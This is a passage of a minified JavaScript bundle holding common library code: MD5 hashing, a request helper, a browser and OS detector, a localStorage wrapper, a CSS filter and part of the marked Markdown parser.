u=c(u,m=l(m,h,g,u,n[t+12],20,-1926607734),h,g,n[t+5],4,-378558),g=c(g,u,m,h,n[t+8],11,-2022574463),h=c(h,g,u,m,n[t+11],16,1839030562),m=c(m,h,g,u,n[t+14],23,-35309556),u=c(u,m,h,g,n[t+1],4,-1530992060),g=c(g,u,m,h,n[t+4],11,1272893353),h=c(h,g,u,m,n[t+7],16,-155497632),m=c(m,h,g,u,n[t+10],23,-1094730640),u=c(u,m,h,g,n[t+13],4,681279174),g=c(g,u,m,h,n[t],11,-358537222),h=c(h,g,u,m,n[t+3],16,-722521979),m=c(m,h,g,u,n[t+6],23,76029189),u=c(u,m,h,g,n[t+9],4,-640364487),g=c(g,u,m,h,n[t+12],11,-421815835),h=c(h,g,u,m,n[t+15],16,530742520),u=p(u,m=c(m,h,g,u,n[t+2],23,-995338651),h,g,n[t],6,-198630844),g=p(g,u,m,h,n[t+7],10,1126891415),h=p(h,g,u,m,n[t+14],15,-1416354905),m=p(m,h,g,u,n[t+5],21,-57434055),u=p(u,m,h,g,n[t+12],6,1700485571),g=p(g,u,m,h,n[t+3],10,-1894986606),h=p(h,g,u,m,n[t+10],15,-1051523),m=p(m,h,g,u,n[t+1],21,-2054922799),u=p(u,m,h,g,n[t+8],6,1873313359),g=p(g,u,m,h,n[t+15],10,-30611744),h=p(h,g,u,m,n[t+6],15,-1560198380),m=p(m,h,g,u,n[t+13],21,1309151649),u=p(u,m,h,g,n[t+4],6,-145523070),g=p(g,u,m,h,n[t+11],10,-1120210379),h=p(h,g,u,m,n[t+2],15,718787259),m=p(m,h,g,u,n[t+9],21,-343485551),u=o(u,a),m=o(m,r),h=o(h,i),g=o(g,d);return[u,m,h,g]}function u(n){var e,t="",a=32*n.length;for(e=0;e<a;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function m(n){var e,t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;var a=8*n.length;for(e=0;e<a;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function h(n){var e,t,a="0123456789abcdef",r="";for(t=0;t<n.length;t+=1)e=n.charCodeAt(t),r+=a.charAt(e>>>4&15)+a.charAt(15&e);return r}function g(n){return unescape(encodeURIComponent(n))}function f(n){return function(n){return u(d(m(n),8*n.length))}(g(n))}function b(n,e){return function(n,e){var t,a,r=m(n),o=[],i=[];for(o[15]=i[15]=void 0,r.length>16&&(r=d(r,8*n.length)),t=0;t<16;t+=1)o[t]=909522486^r[t],i[t]=1549556828^r[t];return a=d(o.concat(m(e)),512+8*e.length),u(d(i.concat(a),640))}(g(n),g(e))}function v(n,e,t){return e?t?b(e,n):function(n,e){return h(b(n,e))}(e,n):t?f(n):function(n){return h(f(n))}(n)}void 0!==(a=function(){return v}.call(e,t,e,n))&&(n.exports=a)}()},function(n,e,t){"use strict";e.__esModule=!0;var a=function(n){return n&&n.__esModule?n:{default:n}}(t(35));e.default=function(n){return n=(0,a.default)({url:"",method:"get",body:{}},n),new Promise((function(e,t){if("jsonp"==n.method){var a="cb_"+(Date.now()+Math.round(1e3*Math.random())).toString(32),r=document,i=r.body,s=r.createElement("script");return s.async=!0,s.defer=!0,n.url.indexOf("?")>-1?n.url+="&"+o({callback:a,t:Date.now()}):n.url+="?"+o({callback:a,t:Date.now()}),s.src=n.url,window[a]=function(n){window[a]=null,i.removeChild(s),e(n)},void i.appendChild(s)}var l="XMLHttpRequest"in window?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"),c=[],p=[],d={};for(var u in o(n.body)&&(n.url=n.url+"?"+("get"==n.method?o(n.body):"")),l.open(n.method||"get",n.url),"blob"==n.dataType&&(l.responseType="blob"),l.onload=function(){l.getAllResponseHeaders().replace(/^(.*?):[^\S\n]*([\s\S]*?)$/gm,(function(n,e,t){c.push(e=e.toLowerCase()),p.push([e,t]),d[e]=d[e]?d[e]+","+t:t})),e(function n(){return{ok:2==(l.status/100|0),statusText:l.statusText,status:l.status,url:l.responseURL,text:function(){return Promise.resolve(l.responseText)},json:function(){return Promise.resolve(l.responseText).then(JSON.parse)},blob:function(){return Promise.resolve(new Blob([l.response]))},clone:n,headers:{keys:function(){return c},entries:function(){return p},get:function(n){return d[n.toLowerCase()]},has:function(n){return n.toLowerCase()in d}}}}())},l.onerror=t,l.withCredentials="include"==n.credentials,n.headers)l.setRequestHeader(u,n.headers[u]);l.send("post"==n.method?n.body:"get"==n.method?"":o(n.body))}))};var r=encodeURIComponent,o=function(n){var e=[];for(var t in n)n.hasOwnProperty(t)&&e.push(r(t)+"="+r(n[t]));return(e=e.join("&").replace(/%20/g,"+"))||""}},function(n,e,t){"use strict";e.__esModule=!0,e.default=function(n){var e={},t={Trident:(n=n||navigator.userAgent).indexOf("Trident")>-1||n.indexOf("NET CLR")>-1,Presto:n.indexOf("Presto")>-1,WebKit:n.indexOf("AppleWebKit")>-1,Gecko:n.indexOf("Gecko/")>-1,Safari:n.indexOf("Safari")>-1,Edge:n.indexOf("Edge")>-1||n.indexOf("Edg")>-1,Chrome:n.indexOf("Chrome")>-1||n.indexOf("CriOS")>-1,IE:n.indexOf("MSIE")>-1||n.indexOf("Trident")>-1,Firefox:n.indexOf("Firefox")>-1||n.indexOf("FxiOS")>-1,"Firefox Focus":n.indexOf("Focus")>-1,Chromium:n.indexOf("Chromium")>-1,Opera:n.indexOf("Opera")>-1||n.indexOf("OPR")>-1,Vivaldi:n.indexOf("Vivaldi")>-1,Yandex:n.indexOf("YaBrowser")>-1,Kindle:n.indexOf("Kindle")>-1||n.indexOf("Silk/")>-1,360:n.indexOf("360EE")>-1||n.indexOf("360SE")>-1,UC:n.indexOf("UC")>-1||n.indexOf(" UBrowser")>-1,QQBrowser:n.indexOf("QQBrowser")>-1,QQ:n.indexOf("QQ/")>-1,Baidu:n.indexOf("Baidu")>-1||n.indexOf("BIDUBrowser")>-1,Maxthon:n.indexOf("Maxthon")>-1,Sogou:n.indexOf("MetaSr")>-1||n.indexOf("Sogou")>-1,LBBROWSER:n.indexOf("LBBROWSER")>-1,"2345Explorer":n.indexOf("2345Explorer")>-1,TheWorld:n.indexOf("TheWorld")>-1,XiaoMi:n.indexOf("MiuiBrowser")>-1,Quark:n.indexOf("Quark")>-1,Qiyu:n.indexOf("Qiyu")>-1,Wechat:n.indexOf("MicroMessenger")>-1,Taobao:n.indexOf("AliApp(TB")>-1,Alipay:n.indexOf("AliApp(AP")>-1,Weibo:n.indexOf("Weibo")>-1,Douban:n.indexOf("com.douban.frodo")>-1,Suning:n.indexOf("SNEBUY-APP")>-1,iQiYi:n.indexOf("IqiyiApp")>-1,Windows:n.indexOf("Windows")>-1,Linux:n.indexOf("Linux")>-1||n.indexOf("X11")>-1,macOS:n.indexOf("Macintosh")>-1,Android:n.indexOf("Android")>-1||n.indexOf("Adr")>-1,Ubuntu:n.indexOf("Ubuntu")>-1,FreeBSD:n.indexOf("FreeBSD")>-1,Debian:n.indexOf("Debian")>-1,"Windows Phone":n.indexOf("IEMobile")>-1||n.indexOf("Windows Phone")>-1,BlackBerry:n.indexOf("BlackBerry")>-1||n.indexOf("RIM")>-1||n.indexOf("BB10")>-1,MeeGo:n.indexOf("MeeGo")>-1,Symbian:n.indexOf("Symbian")>-1,iOS:n.indexOf("like Mac OS X")>-1,"Chrome OS":n.indexOf("CrOS")>-1,WebOS:n.indexOf("hpwOS")>-1,Mobile:n.indexOf("Mobi")>-1||n.indexOf("iPh")>-1||n.indexOf("480")>-1,Tablet:n.indexOf("Tablet")>-1||n.indexOf("Pad")>-1||n.indexOf("Nexus 7")>-1};t.Mobile&&(t.Mobile=!(n.indexOf("iPad")>-1));var a={browser:["Safari","Chrome","Edge","IE","Firefox","Firefox Focus","Chromium","Opera","Vivaldi","Yandex","Kindle","360","UC","QQBrowser","QQ","Baidu","Maxthon","Sogou","LBBROWSER","2345Explorer","TheWorld","XiaoMi","Quark","Qiyu","Wechat","Taobao","Alipay","Weibo","Douban","Suning","iQiYi"],os:["Windows","Linux","Mac OS","macOS","Android","Ubuntu","FreeBSD","Debian","iOS","Windows Phone","BlackBerry","MeeGo","Symbian","Chrome OS","WebOS"]};for(var r in a)if(a.hasOwnProperty(r))for(var o=0,i=a[r].length;o<i;o++){var s=a[r][o];t[s]&&(e[r]=s)}var l={Windows:function(){return{"10.0":"10/11",6.4:"10",6.3:"8.1",6.2:"8",6.1:"7","6.0":"Vista",5.2:"XP",5.1:"XP","5.0":"2000"}[n.replace(/^.*Windows NT ([\d.]+).*$/,"$1")]},Android:n.replace(/^.*Android ([\d.]+);.*$/,"$1"),iOS:n.replace(/^.*OS ([\d_]+) like.*$/,"$1").replace(/_/g,"."),Debian:n.replace(/^.*Debian\/([\d.]+).*$/,"$1"),"Windows Phone":n.replace(/^.*Windows Phone( OS)? ([\d.]+);.*$/,"$2"),macOS:n.replace(/^.*Mac OS X ([\d_]+).*$/,"$1").replace(/_/g,"."),WebOS:n.replace(/^.*hpwOS\/([\d.]+);.*$/,"$1"),BlackBerry:n.replace(/^.*BB([\d.]+);*$/,"$1")};e.osVersion="";var c=l[e.os];c&&(e.osVersion="function"==typeof c?c():c==n?"":c);var p={Safari:n.replace(/^.*Version\/([\d.]+).*$/,"$1"),Chrome:n.replace(/^.*Chrome\/([\d.]+).*$/,"$1").replace(/^.*CriOS\/([\d.]+).*$/,"$1"),IE:n.replace(/^.*MSIE ([\d.]+).*$/,"$1").replace(/^.*rv:([\d.]+).*$/,"$1"),Edge:n.replace(/^.*Edge?\/([\d.]+).*$/,"$1"),Firefox:n.replace(/^.*Firefox\/([\d.]+).*$/,"$1").replace(/^.*FxiOS\/([\d.]+).*$/,"$1"),"Firefox Focus":n.replace(/^.*Focus\/([\d.]+).*$/,"$1"),Chromium:n.replace(/^.*Chromium\/([\d.]+).*$/,"$1"),Opera:n.replace(/^.*Opera\/([\d.]+).*$/,"$1").replace(/^.*OPR\/([\d.]+).*$/,"$1"),Vivaldi:n.replace(/^.*Vivaldi\/([\d.]+).*$/,"$1"),Yandex:n.replace(/^.*YaBrowser\/([\d.]+).*$/,"$1"),Kindle:n.replace(/^.*Version\/([\d.]+).*$/,"$1"),Maxthon:n.replace(/^.*Maxthon\/([\d.]+).*$/,"$1"),QQBrowser:n.replace(/^.*QQBrowser\/([\d.]+).*$/,"$1"),QQ:n.replace(/^.*QQ\/([\d.]+).*$/,"$1"),Baidu:n.replace(/^.*BIDUBrowser[\s\/]([\d.]+).*$/,"$1"),UC:n.replace(/^.*UC?Browser\/([\d.]+).*$/,"$1"),Sogou:n.replace(/^.*SE ([\d.X]+).*$/,"$1").replace(/^.*SogouMobileBrowser\/([\d.]+).*$/,"$1"),"2345Explorer":n.replace(/^.*2345Explorer\/([\d.]+).*$/,"$1"),TheWorld:n.replace(/^.*TheWorld ([\d.]+).*$/,"$1"),XiaoMi:n.replace(/^.*MiuiBrowser\/([\d.]+).*$/,"$1"),Quark:n.replace(/^.*Quark\/([\d.]+).*$/,"$1"),Qiyu:n.replace(/^.*Qiyu\/([\d.]+).*$/,"$1"),Wechat:n.replace(/^.*MicroMessenger\/([\d.]+).*$/,"$1"),Taobao:n.replace(/^.*AliApp\(TB\/([\d.]+).*$/,"$1"),Alipay:n.replace(/^.*AliApp\(AP\/([\d.]+).*$/,"$1"),Weibo:n.replace(/^.*weibo__([\d.]+).*$/,"$1"),Douban:n.replace(/^.*com.douban.frodo\/([\d.]+).*$/,"$1"),Suning:n.replace(/^.*SNEBUY-APP([\d.]+).*$/,"$1"),iQiYi:n.replace(/^.*IqiyiVersion\/([\d.]+).*$/,"$1")};e.version="";var d=p[e.browser];return d&&(e.version="function"==typeof d?d():d==n?"":d),null==e.browser&&(e.browser="Unknow App"),e}},function(n,e,t){"use strict";e.__esModule=!0,e.default=function(n){n=Object(n);for(var e=1,t=arguments.length;e<t;e++){var a=arguments[e];if(a)for(var r in a)Object.prototype.hasOwnProperty.call(a,r)&&(n[r]=a[r])}return n}},function(n,e,t){"use strict";function a(n){return/^\{[\s\S]*\}$/.test(JSON.stringify(n))}function r(n){return"[object Function]"==={}.toString.call(n)}function o(n){return"[object Array]"==={}.toString.call(n)}function i(n){if("string"==typeof n)try{return JSON.parse(n)}catch(e){return n}}function s(){if(!(this instanceof s))return new s}function l(n,e){var t=arguments,i=null;if(p||(p=s()),0===t.length)return p.get();if(1===t.length){if("string"==typeof n)return p.get(n);if(a(n))return p.set(n)}if(2===t.length&&"string"==typeof n){if(!e)return p.remove(n);if(e&&"string"==typeof e)return p.set(n,e);e&&r(e)&&(i=null,i=e(n,p.get(n)),l.set(n,i))}if(2===t.length&&o(n)&&r(e))for(var c=0,d=n.length;c<d;c++)i=e(n[c],p.get(n[c])),l.set(n[c],i);return l}e.__esModule=!0;var c=window.localStorage;c=function(n){var e="_Is_Incognit";try{n.setItem(e,"yes")}catch(e){if(["QuotaExceededError","NS_ERROR_DOM_QUOTA_REACHED"].indexOf(e.name)>-1){var t=function(){};n.__proto__={setItem:t,getItem:t,removeItem:t,clear:t}}}finally{"yes"===n.getItem(e)&&n.removeItem(e)}return n}(c),s.prototype={set:function(n,e){if(n&&!a(n))c.setItem(n,function(n){return void 0===n||"function"==typeof n?n+"":JSON.stringify(n)}(e));else if(a(n))for(var t in n)this.set(t,n[t]);return this},get:function(n){if(!n){var e={};return this.each((function(n,t){return e[n]=t})),e}if("?"===n.charAt(0))return this.has(n.substr(1));var t=arguments;if(t.length>1){for(var a={},r=0,o=t.length;r<o;r++){var s=i(c.getItem(t[r]));s&&(a[t[r]]=s)}return a}return i(c.getItem(n))},clear:function(){return c.clear(),this},remove:function(n){var e=this.get(n);return c.removeItem(n),e},has:function(n){return{}.hasOwnProperty.call(this.get(),n)},keys:function(){var n=[];return this.each((function(e){n.push(e)})),n},each:function(n){for(var e=0,t=c.length;e<t;e++){var a=c.key(e);n(a,this.get(a))}return this},search:function(n){for(var e=this.keys(),t={},a=0,r=e.length;a<r;a++)e[a].indexOf(n)>-1&&(t[e[a]]=this.get(e[a]));return t}};var p=null;for(var d in s.prototype)l[d]=s.prototype[d];e.default=l},function(n,e,t){var a,r;r=function(n,e,t){function a(e,r,o){return o=Object.create(a.fn),e&&o.push.apply(o,e.addEventListener?[e]:""+e===e?/</.test(e)?((r=n.createElement(r)).innerHTML=e,r.children):r?(r=a(r)[0])?r[t](e):o:n[t](e):e),o}return a.fn=[],a.one=function(n,e){return a(n,e)[0]||null},a}(document,0,"querySelectorAll"),void 0!==(a=function(){return r}.apply(e,[]))&&(n.exports=a)},function(n,e,t){"use strict";var a=t(1),r=t(10),o=r(a("String.prototype.indexOf"));n.exports=function(n,e){var t=a(n,!!e);return"function"==typeof t&&o(n,".prototype.")>-1?r(t):t}},function(n,e,t){function a(n){return null==n}function r(n){(n=function(n){var e={};for(var t in n)e[t]=n[t];return e}(n||{})).whiteList=n.whiteList||o.whiteList,n.onAttr=n.onAttr||o.onAttr,n.onIgnoreAttr=n.onIgnoreAttr||o.onIgnoreAttr,n.safeAttrValue=n.safeAttrValue||o.safeAttrValue,this.options=n}var o=t(11),i=t(40);t(12),r.prototype.process=function(n){if(!(n=(n=n||"").toString()))return"";var e=this.options,t=e.whiteList,r=e.onAttr,o=e.onIgnoreAttr,s=e.safeAttrValue;return i(n,(function(n,e,i,l,c){var p=t[i],d=!1;if(!0===p?d=p:"function"==typeof p?d=p(l):p instanceof RegExp&&(d=p.test(l)),!0!==d&&(d=!1),l=s(i,l)){var u,m={position:e,sourcePosition:n,source:c,isWhite:d};return d?a(u=r(i,l,m))?i+":"+l:u:a(u=o(i,l,m))?void 0:u}}))},n.exports=r},function(n,e,t){var a=t(12);n.exports=function(n,e){function t(){if(!o){var t=a.trim(n.slice(i,s)),r=t.indexOf(":");if(-1!==r){var c=a.trim(t.slice(0,r)),p=a.trim(t.slice(r+1));if(c){var d=e(i,l.length,c,p,t);d&&(l+=d+"; ")}}}i=s+1}";"!==(n=a.trimRight(n))[n.length-1]&&(n+=";");for(var r=n.length,o=!1,i=0,s=0,l="";s<r;s++){var c=n[s];if("/"===c&&"*"===n[s+1]){var p=n.indexOf("*/",s+2);if(-1===p)break;i=(s=p+1)+1,o=!1}else"("===c?o=!0:")"===c?o=!1:";"===c?o||t():"\n"===c&&t()}return a.trim(l)}},function(n,e,t){"use strict";n.exports=EvalError},function(n,e,t){"use strict";n.exports=Error},function(n,e,t){"use strict";n.exports=RangeError},function(n,e,t){"use strict";n.exports=ReferenceError},function(n,e,t){"use strict";n.exports=URIError},function(n,e,t){"use strict";var a=t(0);n.exports=function(n){if(null==n)throw new a(arguments.length>0&&arguments[1]||"Cannot call method on "+n);return n}},function(n,e,t){"use strict";var a=Object.prototype.toString,r=Math.max,o=function(n,e){for(var t=[],a=0;a<n.length;a+=1)t[a]=n[a];for(var r=0;r<e.length;r+=1)t[r+n.length]=e[r];return t},i=function(n,e){for(var t=[],a=e||0,r=0;a<n.length;a+=1,r+=1)t[r]=n[a];return t},s=function(n,e){for(var t="",a=0;a<n.length;a+=1)t+=n[a],a+1<n.length&&(t+=e);return t};n.exports=function(n){var e=this;if("function"!=typeof e||"[object Function]"!==a.apply(e))throw new TypeError("Function.prototype.bind called on incompatible "+e);for(var t,l=i(arguments,1),c=function(){if(this instanceof t){var a=e.apply(this,o(l,arguments));return Object(a)===a?a:this}return e.apply(n,o(l,arguments))},p=r(0,e.length-l.length),d=[],u=0;u<p;u++)d[u]="$"+u;if(t=Function("binder","return function ("+s(d,",")+"){ return binder.apply(this,arguments); }")(c),e.prototype){var m=function(){};m.prototype=e.prototype,t.prototype=new m,m.prototype=null}return t}},function(n,e,t){n.exports=function(){"use strict";var n=function(n,e){return function(n){var e=n.exports=function(){return new RegExp("(?:"+e.line().source+")|(?:"+e.block().source+")","gm")};e.line=function(){return/(?:^|\s)\/\/(.+?)$/gm},e.block=function(){return/\/\*([\S\s]*?)\*\//gm}}(e={exports:{}}),e.exports}(),e=["23AC69","91C132","F19726","E8552D","1AAB8E","E1147F","2980C1","1BA1E6","9FA0A0","F19726","E30B20","E30B20","A3338B"];return function(t,a){void 0===a&&(a={});var r=a.colors;void 0===r&&(r=e);var o=0,i={},s=new RegExp("("+/[\u4E00-\u9FFF\u3400-\u4dbf\uf900-\ufaff\u3040-\u309f\uac00-\ud7af\u0400-\u04FF]+|\w+/.source+"|"+/</.source+")|("+n().source+")","gmi");return t.replace(s,(function(n,e,t){if(t)return function(n){return'<span style="color: slategray">'+n+"</span>"}(t);if("<"===e)return"&lt;";var a;i[e]?a=i[e]:(a=r[o],i[e]=a);var s='<span style="color: #'+a+'">'+e+"</span>";return o=++o%r.length,s}))}}()},function(n,e,t){"use strict";var a={__proto__:null,foo:{}},r=Object;n.exports=function(){return{__proto__:a}.foo===a.foo&&!(a instanceof r)}},function(n,e,t){"use strict";var a="undefined"!=typeof Symbol&&Symbol,r=t(51);n.exports=function(){return"function"==typeof a&&"function"==typeof Symbol&&"symbol"==typeof a("foo")&&"symbol"==typeof Symbol("bar")&&r()}},function(n,e,t){"use strict";n.exports=function(){if("function"!=typeof Symbol||"function"!=typeof Object.getOwnPropertySymbols)return!1;if("symbol"==typeof Symbol.iterator)return!0;var n={},e=Symbol("test"),t=Object(e);if("string"==typeof e)return!1;if("[object Symbol]"!==Object.prototype.toString.call(e))return!1;if("[object Symbol]"!==Object.prototype.toString.call(t))return!1;for(e in n[e]=42,n)return!1;if("function"==typeof Object.keys&&0!==Object.keys(n).length)return!1;if("function"==typeof Object.getOwnPropertyNames&&0!==Object.getOwnPropertyNames(n).length)return!1;var a=Object.getOwnPropertySymbols(n);if(1!==a.length||a[0]!==e)return!1;if(!Object.prototype.propertyIsEnumerable.call(n,e))return!1;if("function"==typeof Object.getOwnPropertyDescriptor){var r=Object.getOwnPropertyDescriptor(n,e);if(42!==r.value||!0!==r.enumerable)return!1}return!0}},function(n,e,t){!function(n){"use strict";function e(n,e){for(var t=0;t<e.length;t++){var a=e[t];a.enumerable=a.enumerable||!1,a.configurable=!0,"value"in a&&(a.writable=!0),Object.defineProperty(n,i(a.key),a)}}function t(n,t,a){return t&&e(n.prototype,t),a&&e(n,a),Object.defineProperty(n,"prototype",{writable:!1}),n}function a(){return(a=Object.assign?Object.assign.bind():function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var a in t)Object.prototype.hasOwnProperty.call(t,a)&&(n[a]=t[a])}return n}).apply(this,arguments)}function r(n,e){(null==e||e>n.length)&&(e=n.length);for(var t=0,a=new Array(e);t<e;t++)a[t]=n[t];return a}function o(n,e){var t="undefined"!=typeof Symbol&&n[Symbol.iterator]||n["@@iterator"];if(t)return(t=t.call(n)).next.bind(t);if(Array.isArray(n)||(t=function(n,e){if(n){if("string"==typeof n)return r(n,e);var t=Object.prototype.toString.call(n).slice(8,-1);return"Object"===t&&n.constructor&&(t=n.constructor.name),"Map"===t||"Set"===t?Array.from(n):"Arguments"===t||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t)?r(n,e):void 0}}(n))||e&&n&&"number"==typeof n.length){t&&(n=t);var a=0;return function(){return a>=n.length?{done:!0}:{done:!1,value:n[a++]}}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function i(n){var e=function(n,e){if("object"!=typeof n||null===n)return n;var t=n[Symbol.toPrimitive];if(void 0!==t){var a=t.call(n,e||"default");if("object"!=typeof a)return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===e?String:Number)(n)}(n,"string");return"symbol"==typeof e?e:String(e)}function s(){return{async:!1,baseUrl:null,breaks:!1,extensions:null,gfm:!0,headerIds:!0,headerPrefix:"",highlight:null,hooks:null,langPrefix:"language-",mangle:!0,pedantic:!1,renderer:null,sanitize:!1,sanitizer:null,silent:!1,smartypants:!1,tokenizer:null,walkTokens:null,xhtml:!1}}function l(e){n.defaults=e}function c(n,e){if(e){if(k.test(n))return n.replace(S,P)}else if(C.test(n))return n.replace(T,P);return n}function p(n){return n.replace(A,(function(n,e){return"colon"===(e=e.toLowerCase())?":":"#"===e.charAt(0)?"x"===e.charAt(1)?String.fromCharCode(parseInt(e.substring(2),16)):String.fromCharCode(+e.substring(1)):""}))}function d(n,e){n="string"==typeof n?n:n.source,e=e||"";var t={replace:function(e,a){return a=(a=a.source||a).replace(E,"$1"),n=n.replace(e,a),t},getRegex:function(){return new RegExp(n,e)}};return t}function u(n,e,t){if(n){var a;try{a=decodeURIComponent(p(t)).replace(_,"").toLowerCase()}catch(n){return null}if(0===a.indexOf("javascript:")||0===a.indexOf("vbscript:")||0===a.indexOf("data:"))return null}e&&!B.test(t)&&(t=function(n,e){I[" "+n]||(z.test(n)?I[" "+n]=n+"/":I[" "+n]=h(n,"/",!0));var t=-1===(n=I[" "+n]).indexOf(":");return"//"===e.substring(0,2)?t?e:n.replace(D,"$1")+e:"/"===e.charAt(0)?t?e:n.replace(F,"$1")+e:n+e}(e,t));try{t=encodeURI(t).replace(/%25/g,"%")}catch(n){return null}return t}function m(n,e){var t=n.replace(/\|/g,(function(n,e,t){for(var a=!1,r=e;--r>=0&&"\\"===t[r];)a=!a;return a?"|":" |"})).split(/ \|/),a=0;if(t[0].trim()||t.shift(),t.length>0&&!t[t.length-1].trim()&&t.pop(),t.length>e)t.splice(e);else for(;t.length<e;)t.push("");for(;a<t.length;a++)t[a]=t[a].trim().replace(/\\\|/g,"|");return t}function h(n,e,t){var a=n.length;if(0===a)return"";for(var r=0;r<a;){var o=n.charAt(a-r-1);if(o!==e||t){if(o===e||!t)break;r++}else r++}return n.slice(0,a-r)}function g(n,e){if(e<1)return"";for(var t="";e>1;)1&e&&(t+=n),e>>=1,n+=n;return t+n}function f(n,e,t,a){var r=e.href,o=e.title?c(e.title):null,i=n[1].replace(/\\([\[\]])/g,"$1");if("!"!==n[0].charAt(0)){a.state.inLink=!0;var s={type:"link",raw:t,href:r,title:o,text:i,tokens:a.inlineTokens(i)};return a.state.inLink=!1,s}return{type:"image",raw:t,href:r,title:o,text:c(i)}}function b(n){return n.replace(/---/g,"—").replace(/--/g,"–").replace(/(^|[-\u2014/(\[{"\s])'/g,"$1‘").replace(/'/g,"’").replace(/(^|[-\u2014/(\[{\u2018\s])"/g,"$1“").replace(/"/g,"”").replace(/\.{3}/g,"…")}function v(n){var e,t,a="",r=n.length;for(e=0;e<r;e++)t=n.charCodeAt(e),Math.random()>.5&&(t="x"+t.toString(16)),a+="&#"+t+";";return a}function y(n,e,t){return function(a){if(a.message+="\nPlease report this to https://github.com/markedjs/marked.",n){var r="<p>An error occurred:</p><pre>"+c(a.message+"",!0)+"</pre>";return e?Promise.resolve(r):t?void t(null,r):r}if(e)return Promise.reject(a);if(!t)throw a;t(a)}}function x(n,e){return function(t,r,o){"function"==typeof r&&(o=r,r=null);var i=a({},r),s=y((r=a({},w.defaults,i)).silent,r.async,o);if(null==t)return s(new Error("marked(): input parameter is undefined or null"));if("string"!=typeof t)return s(new Error("marked(): input parameter is of type "+Object.prototype.toString.call(t)+", string expected"));if(function(n){n&&n.sanitize&&n.silent}(r),r.hooks&&(r.hooks.options=r),o){var l,c=r.highlight;try{r.hooks&&(t=r.hooks.preprocess(t)),l=n(t,r)}catch(n){return s(n)}var p=function(n){var t;if(!n)try{r.walkTokens&&w.walkTokens(l,r.walkTokens),t=e(l,r),r.hooks&&(t=r.hooks.postprocess(t))}catch(e){n=e}return r.highlight=c,n?s(n):o(null,t)};if(!c||c.length<3)return p();if(delete r.highlight,!l.length)return p();var d=0;return w.walkTokens(l,(function(n){"code"===n.type&&(d++,setTimeout((function(){c(n.text,n.lang,(function(e,t){if(e)return p(e);null!=t&&t!==n.text&&(n.text=t,n.escaped=!0),0==--d&&p()}))}),0))})),void(0===d&&p())}if(r.async)return Promise.resolve(r.hooks?r.hooks.preprocess(t):t).then((function(e){return n(e,r)})).then((function(n){return r.walkTokens?Promise.all(w.walkTokens(n,r.walkTokens)).then((function(){return n})):n})).then((function(n){return e(n,r)})).then((function(n){return r.hooks?r.hooks.postprocess(n):n})).catch(s);try{r.hooks&&(t=r.hooks.preprocess(t));var u=n(t,r);r.walkTokens&&w.walkTokens(u,r.walkTokens);var m=e(u,r);return r.hooks&&(m=r.hooks.postprocess(m)),m}catch(n){return s(n)}}}function w(n,e,t){return x(R.lex,W.parse)(n,e,t)}n.defaults={async:!1,baseUrl:null,breaks:!1,extensions:null,gfm:!0,headerIds:!0,headerPrefix:"",highlight:null,hooks:null,langPrefix:"language-",mangle:!0,pedantic:!1,renderer:null,sanitize:!1,sanitizer:null,silent:!1,smartypants:!1,tokenizer:null,walkTokens:null,xhtml:!1};var k=/[&<>"']/,S=new RegExp(k.source,"g"),C=/[<>"']|&(?!(#\d{1,7}|#[Xx][a-fA-F0-9]{1,6}|\w+);)/,T=new RegExp(C.source,"g"),j={"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"},P=function(n){return j[n]},A=/&(#(?:\d+)|(?:#x[0-9A-Fa-f]+)|(?:\w+));?/gi,E=/(^|[^\[])\^/g,_=/[^\w:]/g,B=/^$|^[a-z][a-z0-9+.-]*:|^[?#]/i,I={},z=/^[^:]+:\/*[^/]*$/,D=/^([^:]+:)[\s\S]*$/,F=/^([^:]+:\/*[^/]*)[\s\S]*$/,O={exec:function(){}},L=function(){function e(e){this.options=e||n.defaults}var t=e.prototype;return t.space=function(n){var e=this.rules.block.newline.exec(n);if(e&&e[0].length>0)return{type:"space",raw:e[0]}},t.code=function(n){var e=this.rules.block.code.exec(n);if(e){var t=e[0].replace(/^ {1,4}/gm,"");return{type:"code",raw:e[0],codeBlockStyle:"indented",text:this.options.pedantic?t:h(t,"\n")}}},t.fences=function(n){var e=this.rules.block.fences.exec(n);if(e){var t=e[0],a=function(n,e){var t=n.match(/^(\s+)(?:```)/);if(null===t)return e;var a=t[1];return e.split("\n").map((function(n){var e=n.match(/^\s+/);return null===e?n:e[0].length>=a.length?n.slice(a.length):n})).join("\n")}(t,e[3]||"");return{type:"code",raw:t,lang:e[2]?e[2].trim().replace(this.rules.inline._escapes,"$1"):e[2],text:a}}},t.heading=function(n){var e=this.rules.block.heading.exec(n);if(e){var t=e[2].trim();if(/#$/.test(t)){var a=h(t,"#");this.options.pedantic?t=a.trim():a&&!/ $/.test(a)||(t=a.trim())}return{type:"heading",raw:e[0],depth:e[1].length,text:t,tokens:this.lexer.inline(t)}}},t.hr=function(n){var e=this.rules.block.hr.exec(n);if(e)return{type:"hr",raw:e[0]}},t.blockquote=function(n){var e=this.rules.block.blockquote.exec(n);if(e){var t=e[0].replace(/^ *>[ \t]?/gm,""),a=this.lexer.state.top;this.lexer.state.top=!0;var r=this.lexer.blockTokens(t);return this.lexer.state.top=a,{type:"blockquote",raw:e[0],tokens:r,text:t}}},t.list=function(n){var e=this.rules.block.list.exec(n);if(e){var t,a,r,o,i,s,l,c,p,d,u,m,h=e[1].trim(),g=h.length>1,f={type:"list",raw:"",ordered:g,start:g?+h.slice(0,-1):"",loose:!1,items:[]};h=g?"\\d{1,9}\\"+h.slice(-1):"\\"+h,this.options.pedantic&&(h=g?h:"[*+-]");for(var b=new RegExp("^( {0,3}"+h+")((?:[\t ][^\\n]*)?(?:\\n|$))");n&&(m=!1,e=b.exec(n))&&!this.rules.block.hr.test(n);){if(t=e[0],n=n.substring(t.length),c=e[2].split("\n",1)[0].replace(/^\t+/,(function(n){return" ".repeat(3*n.length)})),p=n.split("\n",1)[0],this.options.pedantic?(o=2,u=c.trimLeft()):(o=(o=e[2].search(/[^ ]/))>4?1:o,u=c.slice(o),o+=e[1].length),s=!1,!c&&/^ 